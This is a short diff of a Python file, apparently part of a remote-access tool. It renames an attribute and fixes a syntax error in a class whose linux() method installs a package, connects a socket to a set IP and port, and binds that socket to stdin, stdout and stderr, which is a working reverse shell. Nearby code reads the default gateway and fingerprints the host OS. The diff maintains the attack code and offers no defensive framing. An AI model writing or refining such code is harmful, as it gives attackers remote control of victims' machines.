@@ -11,7 +11,7 @@ import socket
 class Details:
     def __init__(self):
         self.os = os.name
-        self.start_Ip = "127.0.0.1"
+        self.ip = "127.0.0.1"
         self.port = 9191
 
     
@@ -63,7 +63,7 @@ class Details:
     def linux(self):
         os.system("pip install psutil")
         s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((self.start_Ip,self.port))
+        s.connect((self.ip,self.port))
         os.dup2(s.fileno(),0)
         os.dup2(s.fileno(),1)
         os.dup2(s.fileno(),2)
@@ -83,7 +83,7 @@ class Details:
                 for line in route_file.readlines():
                     fields = line.strip().split()
                     if fields[1] == "00000000":
-                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16))
+                        return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
         return None
 
     ## TO IDENTIFY THE HOST OS
